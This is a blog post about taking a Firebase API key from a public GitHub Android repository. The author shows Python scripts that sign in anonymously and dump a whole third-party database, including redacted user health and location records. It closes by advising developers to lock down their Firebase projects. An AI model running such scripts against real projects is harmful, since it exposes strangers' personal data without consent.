+++
title = "What happens when you push your Firebase API key to GitHub"
date = "2025-02-27"
+++

Recently I've been working on a new project, and decided to get some inspiration from public repositories on GitHub.  
I've found a repository with a code for Android app, based on game called `Death Stranding`, and as a fan of this game - decided to clone it and run it.  

`README.md` file was very clear, however it had installation via `npm` while we have to use `gradle` for Android projects, last commit was like few months ago, it had a release but with code only.  
Long story short, I've cloned the repository, opened it in Android Studio, and tried to run it, id did it without any issues, a Authorization screen appeared.  
At this point I thought that was it, as I didn't want to create new Firebase project and connect it to this app, but then I've noticed that there's a `google-services.json` file in the project. 
Normally it's okay, because you can reverse engineer the APK to get them, however it contained all of the API keys, and I got curious what will happen if I use them.

Straight away new `python` script was created, which was sending a request to Firebase API:
```python
import requests

API_KEY = "SOME_API_KEY"
DATABASE_URL = "https://gg.europe-west1.firebasedatabase.app"


def sign_in_anonymously():
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}"
    response = requests.post(url, json={"returnSecureToken": True})
    if response.status_code == 200:
        return response.json()["idToken"]
    return None


id_token = sign_in_anonymously()
print("ID Token:", id_token)
```

After running this script, I've got a response with `idToken`, which was a valid token for this Firebase project.

That's it, we have read/write access to the Firebase database, and we can do whatever we want with it.

Let's extend this script to pull all of the data from the database:
```python
def get_data(node, id_token):
    url = f"{DATABASE_URL}/{node}.json?auth={id_token}"
    response = requests.get(url)
    return response.json() if response.status_code == 200 else response.text


nodes = get_data("", id_token)

for node in nodes:
    write_data = get_data(node, id_token)
    with open(f"data_{node}.json", "w") as f:
        write_data = (
            {key: value for key, value in write_data.items()}
            if isinstance(write_data, dict)
            else write_data
        )
        f.write(json.dumps(write_data, indent=4))
    print(f"Data saved to data_{node}.json")

```
execution:
```bash
Data saved to data_deliveries.json
Data saved to data_post_offices.json
Data saved to data_signals.json
Data saved to data_users.json
Data saved to data_weather.json
Data saved to data_weatherCurrentInApp.json
```

After running this script, we will have all of the data from the Firebase database saved in separate files.
Here's some example data from `data_users.json`(personal data was removed):
```json
{
    "8AvbIz4G5BWS____REDACTED": {
        "bloodType": "REDACTED",
        "deliveries": 0,
        "distanceWalked": 0,
        "dob": "REDACTED",
        "height": "REDACTED",
        "name": "REDACTED REDACTED",
        "photoUrl": "REDACTED",
        "timefallExposure": 0,
        "weight": "REDACTED"
    },
    "8DBp4bNCibfp____REDACTED": {
        "bloodType": "REDACTED",
        "deliveries": 2,
        "distanceWalked": 0,
        "dob": "REDACTED",
        "height": "REDACTED",
        "name": "REDACTED REDACTED",
        "photoUrl": "REDACTED",
        "timefallExposure": 0,
        "weight": "REDACTED"
    },
}
```

From `data_signals.json` we could've se latitudes and longitudes of some user-generated signals, some of them correspond to the developers home location.  

While you can push your `google-services.json` to GitHub, you should properly secure your Firebase project and restrict access to it, as it's very easy to get access to it.